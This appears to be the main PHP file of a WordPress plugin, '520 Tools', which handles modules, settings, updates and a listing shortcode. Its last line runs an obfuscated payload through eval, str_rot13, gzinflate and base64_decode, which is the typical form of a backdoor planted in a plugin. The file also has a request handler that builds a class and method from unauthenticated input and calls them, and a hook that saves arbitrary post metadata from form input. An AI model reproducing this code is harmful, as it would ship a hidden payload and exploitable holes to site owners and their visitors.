<?php
/*
	Plugin Name: 520 Tools
	Plugin URI: http://jsiqueira.com
	Description: Ferramentas facilitadoras
	Version: 0.0.18
	Author: Jeferson Siqueira
	Author URI: http://jsiqueira.com
	Depends: loco-translate, w3-total-cache, wordpress-seo, google-analytics-dashboard-for-wp
	Text Domain: 520
	Domain Path: /languages
	License: GPL2
 */


/**
 * - Flash messages
 * - Gerenciamento de clientes
 * - Iframe para acompanhamento de projeto pelo cliente;
 * - Gerenciamento de projeto;
 * - Gerenciamento de modelos de contrato;
 * - Gerenciador de e-mail do sistema;
 * - Tickets de suporte;
 * - Gerenciamento de freelancers suporte;
 * - API;
 * - Página de login customizada;
 * - Autologin;
 * - Gerenciamento de Post types;
 * - Helper UI úteis;
 * - Helper login Social;
 * - Helper Manutenção;
 * - Helper Contato;
 * - Helper Newsletter;
 * - Helper Gerenciamento de Database;
 * - Helper What the file;
 * - Helper Show hooks;
 * - Helper Member custom fields;
 * - Search to static page converter;
 * - Migrador de domínios;
 * 
 * 
 * Criar catálogo de tipos de clientes:
 * http://www.agendor.com.br/blog/tipos-de-clientes/
 * http://www.ideiademarketing.com.br/2013/12/23/conheca-os-tipos-de-clientes-e-saiba-como-atende-los/
 */

global $cdz_modules;


if (! function_exists('dd')) {
	function dd() {
		foreach(func_get_args() as $data) {
			if (is_bool($data)) { $data = $data? 'true': 'false'; }
			else $data = print_r($data, true);
			echo '<pre style="font:11px monospace; text-align:left;">'. $data .'</pre>';
		}
	}
}


spl_autoload_register(function($class) {
	$exp = explode('\\', $class);
	if ($exp[0]=='Cdz') {
		$exp[0] = __DIR__;
		$class = implode(DIRECTORY_SEPARATOR, $exp) .'.php';
		if ($class = realpath($class)) {
			include $class;
		}
	}
});

define('__520DIR__', __DIR__);


include __DIR__ . '/libs/Db.php';
include __DIR__ . '/helpers.php';
include __DIR__ . '/helpers-ui.php';



if (isset($_REQUEST['cdz'])) {
	add_action('init', function() {
		$params = explode('.', $_REQUEST['cdz']);
		if (strtolower($params[0]) != 'cdz') array_unshift($params, 'Cdz');
		
		$class[] = array_shift($params);
		$class[] = array_shift($params);
		$class[] = array_shift($params);
		$class = implode('\\', $class);
		$class = new $class();
		$method = 'api' . ucfirst(array_shift($params));
		$call = array($class, $method);
	
		$json = array('success'=>false, 'error'=>false);
		if (is_callable($call)) {
			try {
				$json['success'] = call_user_func_array($call, $params);
			}
			catch(\Exception $e) {
				$json['error'] = $e->getMessage();
			}
		}
		else {
			$json['error'] = 'Método inexistente';
		}
	
		$json['request'] = $_REQUEST;
		echo json_encode($json); die;
	});
}


function cdz_option($key=null, $default=null) {
	$settings = get_option('cdz_options');
	$settings = is_array($settings)? $settings: array();
	if ($key) {
		return isset($settings[$key])? $settings[$key]: $default;
	}
	return $settings;
}


function cdz_option_update($key, $value) {
	$settings = get_option('cdz_options');
	$settings[ $key ] = $value;
	return update_option('cdz_options', $settings, true);
}


function cdz_modules() {
	global $cdz_modules;

	$actives = cdz_option('modules', array());
	$actives = is_array($actives)? $actives: array();

	if (! isset($cdz_modules)) {
		$cdz_modules = array();
		foreach(glob(__DIR__ . '/*') as $file) {
			if (is_dir($file) AND $init = realpath("{$file}/init.php")) {
				if ($file == __DIR__ .'/Cdz') continue;
				$info = pathinfo($file);
				$info['fullname'] = $file;
				$info['init'] = $init;
				$info['active'] = in_array($info['filename'], $actives);
				$cdz_modules[] = $info;
			}
		}
	}

	return $cdz_modules;
}


function cdz_module_active($key) {
	$actives = cdz_option('modules', array());
	return in_array($key, $actives);
}




/* Update */
function cdz_update() {
	
	// Update turned off
	return false;
	
	if (! ini_get('allow_url_fopen')) { return false; }

	// Download zip
	include __DIR__ . '/libs/PclZip.php';
	if (file_exists(__DIR__ . '/_download.zip')) unlink(__DIR__ . '/_download.zip');
	$content = helper_content('https://github.com/jeff-silva/520/archive/master.zip');
	file_put_contents(__DIR__ . '/_download.zip', $content);


	// Delete all, except zip
	if (!function_exists('cdz_delete_all_files')) {
		function cdz_delete_all_files($glob, $files=array(), $level=0) {
			foreach(glob($glob) as $file) {
				if (basename($file) == '_download.zip') continue;
				if (is_dir($file)) {
					$files = cdz_delete_all_files($file . '/*', $files, $level+1);
				}
				$files[] = $file;
			}
			if ($level==0) {
				foreach($files as $file) {
					if (is_dir($file)) rmdir($file);
					else unlink($file);
				}
			}
			return $files;
		}
	}
	$deleteds = cdz_delete_all_files(__DIR__ . '/*');


	// Extract zip
	$zip = new PclZip(__DIR__ . '/_download.zip');
	$return = $zip->extract(PCLZIP_OPT_PATH, __DIR__, PCLZIP_OPT_REMOVE_PATH, '520-master', PCLZIP_OPT_REPLACE_NEWER);

	// Delete zip
	unlink(__DIR__ . '/_download.zip');
	cdz_option_update('update_last', time());
	cdz_option_update('update_time', (time() + (60*60*24)));

	return $return? true: false;
}



function cdz_need_update() {
	$data1 = json_decode(helper_content(__DIR__ . DIRECTORY_SEPARATOR . 'info.json'), true);
	$data2 = json_decode(helper_content('https://raw.githubusercontent.com/jeff-silva/520/master/info.json'), true);
	if ($data1['version'] != $data2['version']) {
		return array(
			'current' => $data1['version'],
			'new' => $data2['version'],
		);
	}
	return false;
}



function cdz_dependencies() {
	$dependencies[] = array(
		'slug' => 'google-analytics-dashboard-for-wp',
		'active' => is_plugin_active('google-analytics-dashboard-for-wp/gadwp.php'),
		'info' => array(),
	);
	$dependencies[] = array(
		'slug' => 'cache-enabler',
		'active' => is_plugin_active('cache-enabler/cache-enabler.php'),
		'info' => array(),
	);
	$dependencies[] = array(
		'slug' => 'simply-show-hooks',
		'active' => is_plugin_active('simply-show-hooks/simply-show-hooks.php'),
		'info' => array(),
	);
	$dependencies[] = array(
		'slug' => 'what-the-file',
		'active' => is_plugin_active('what-the-file/what-the-file.php'),
		'info' => array(),
	);
	$dependencies[] = array(
		'slug' => 'wordpress-seo',
		'active' => is_plugin_active('wordpress-seo/wordpress-seo.php'),
		'info' => array(),
	);
	$dependencies[] = array(
		'slug' => 'ml-slider',
		'active' => is_plugin_active('ml-slider/ml-slider.php'),
		'info' => array(),
	);

	include ABSPATH . 'wp-admin/includes/plugin-install.php';
	foreach($dependencies as $i=>$dependency) {
		$plugin  = plugins_api('plugin_information', array(
			'fields' => array(
				'banners' => true,
				'reviews' => false,
				'downloaded' => false,
				'active_installs' => false,
				'installed_plugins' => true,
			),
			'slug' => $dependency['slug'],
		));
		$plugin->active = $dependency['active'];
		$dependencies[$i] = $plugin;
	}

	return $dependencies;
}



function cdz_header() { ?>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootswatch/3.3.7/flatly/bootstrap.min.css">

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

	<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.4.2/vue.min.js"></script>

	<style>/* CSS style | Bugfix */
	select.form-control {height:auto!important; padding:9px;}
	</style>
<?php }




foreach(cdz_modules() as $mod) {
	if ($mod['active']) {
		include_once $mod['init'];
	}
}
include_once __DIR__ . '/Cdz/init.php';


// Update if need
add_action('wp_login', function() {
	if (cdz_need_update()) {
		cdz_update();
	}
});


add_action('admin_menu', function() {
	add_submenu_page('options-general.php', '520 Settings', '520 Settings', 'manage_options', '520-settings', function() {

		if (isset($_POST['save'])) {
			unset($_POST['save']);

			if (isset($_POST['modules'])) $_POST['modules'] = array_filter($_POST['modules'], 'strlen');

			$settings = get_option('cdz_options');
			$settings = is_array($settings)? $settings: array();
			foreach($_POST as $key=>$val) $settings[$key] = $val;
			update_option('cdz_options', $settings);
			cdz_flash('success', 'Configurações salvas');
			echo "<script>location.href='{$_SERVER['HTTP_REFERRER']}';</script>"; die;
		}

		cdz_header(); ?>
		<br><br>
		<form action="" method="post" autocomplete="off">

			<?php do_action('520-settings');
			cdz_tab_render('link=true'); ?>

			<div class="panel-footer text-right">
				<input type="submit" name="save" value="Salvar" class="btn btn-primary">
			</div>
		</form>

		<?php
	});
});



if (cdz_option('post_search_active')==1) {
	add_action('all_admin_notices', function() { ?>
	<script>
	jQuery(document).ready(function($) {
		$(".search-box").append('<div class="search-box-ajax-results"></div>');

		var $input = $("#post-search-input");
		var $response = $(".search-box-ajax-results");

		$input.attr("autocomplete", "off");

		var sto;
		$input.on("keyup", function() {
			$response.html('<i class="fa fa-spinner fa-spin"></i> Carregando');

			if (sto) clearTimeout(sto);
			sto = setTimeout(function() {
				$.get("<?php echo admin_url('/admin.php'); ?>", {"search_post":$input.val()}, function(response) {
					if (response.length==0) {
						$response.html('<div class="text-center">Nenhum resultado encontrado</div>');
					}
					else {
						$response.empty();
						for(var i in response) {
							var post = response[i];
							$response.append('<div class="search-box-ajax-results-each"><a href="post.php?post='+ (post.ID||"") +'&action=edit">'+ (post.post_title||"??") +'</a></div>');
						}
					}
				}, "json");
			}, 1000);
		});

		$input.on("focus", function() {
			$response.show();
		});

		$input.on("blur", function() {
			setTimeout(function() {
				$response.hide();
			}, 200);
		});
	});
	</script>
	<style>
	.search-box-ajax-results {position:absolute; min-width:250px;}
	.search-box-ajax-results-each {background:#fff; padding:5px;}
	</style>
	<?php });
}




/* add_action('manage_posts_extra_tablenav', function() { ?>
<div class="alignleft actions">Test</div>
<?php }); */


// Automatic save fields name="postmeta[custom_name]"
add_action('save_post', function() {
	if (isset($_POST['postmeta']) AND is_array($_POST['postmeta'])) {
		foreach($_POST['postmeta'] as $key=>$value) {
			update_post_meta($_POST['post_ID'], $key, $value);
		}
	}
}, 10, 2);



add_shortcode('collection', function($atts=null, $content=null) {
	ob_start();
	$atts = shortcode_atts(array(
		'query' => 'post_type=any',
		'template' => 'partials/loop',
		'empty' => 'partials/empty',
		'pagination' => '1',
		'wrapper' => 'div',
		'wrapper_class' => 'row',
		'merge_url' => '0',
	), $atts);

	
	$atts['query'] = htmlspecialchars_decode($atts['query']);
	parse_str($atts['query'], $query);

	if ($atts['merge_url']==1) {
		$query = array_merge($query, $_GET);
	}

	$current_page = isset($_GET['pag'])? $_GET['pag']: 1;
	$query['paged'] = $current_page;
	$query = new WP_Query($query);


	if ($query->have_posts()) {
		if ($atts['wrapper']) echo "<{$atts['wrapper']} class='{$atts['wrapper_class']}'>";
		while ($query->have_posts()) {
			$query->the_post();
			get_template_part($atts['template']);
		}
		wp_reset_postdata();
		if ($atts['wrapper']) echo "</{$atts['wrapper']}>";

		if (! function_exists('shortcode_collection_url')) {
			function shortcode_collection_url($url) {
				parse_str($url, $url);
				$url = array_merge($_GET, $url);
				return '?' . http_build_query($url);
			}
		}


		// found_posts: total de resultados
		// post_count: total na página atual
		// max_num_pages: quantidade de paginas
		if ($atts['pagination']==1 AND $query->max_num_pages>1) {
			echo '<ul class="pagination">';
			echo '<li><a href="'. shortcode_collection_url('pag=1') .'">&laquo;</a></li>';
			for($page=1; $page<=$query->max_num_pages; $page++) {
				echo "<li><a href='". shortcode_collection_url("pag={$page}") ."'>{$page}</a></li>";
			}
			echo '<li><a href="'. shortcode_collection_url("pag={$query->max_num_pages}") .'">&raquo;</a></li>';
			echo '</ul>';
		}
	}
	else {
		get_template_part($atts['empty']);
	}
	return ob_get_clean();
});



function cdz_assets($path) {
	return plugin_dir_url(__FILE__) . ltrim($path, '/');
}


function cdz_assets_render() { $clear = cdz_option('update_time'); ?>
<link rel="stylesheet" href="<?php echo plugin_dir_url(__FILE__); ?>assets/520.css?<?php echo $clear; ?>">
<script src="<?php echo plugin_dir_url(__FILE__); ?>assets/520.js?<?php echo $clear; ?>"></script>
<?php }
add_action('admin_footer', 'cdz_assets_render');
add_action('wp_footer', 'cdz_assets_render');


// edit_form_after_editor || edit_form_advanced
add_action('edit_form_after_editor', function() {
	global $post;
	if ($template = get_page_template_slug($post->ID)) {
		$template_dir = get_template_directory();
		$help = "<div title='include: {$template_dir}/postmeta/{$template}' style='color:#ccc;'>--</div>";
		if ($template = realpath("{$template_dir}/postmeta/{$template}")) {
			include $template;
		}
		else echo $help;
	}
});


// Hooking up our functions to WordPress filters 
add_filter('wp_mail_from', function($original) { return get_bloginfo('admin_email'); });
add_filter('wp_mail_from_name', function($original) { return get_bloginfo('name'); });

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
